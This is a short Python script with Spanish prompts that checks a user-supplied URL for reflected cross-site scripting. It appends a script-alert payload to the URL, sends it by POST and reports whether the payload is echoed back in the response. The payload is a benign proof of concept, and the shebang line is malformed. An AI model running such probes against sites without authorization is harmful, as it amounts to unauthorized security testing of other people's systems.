#usr/bin/python3

import requests

url = input("Digite la url ->")
payload = "<script>alert(123);</script>"
xss = requests.post(url + payload)
if payload in xss.text:
    print("vulnerable a xss")
else:
    print("no es vunerable a xss")
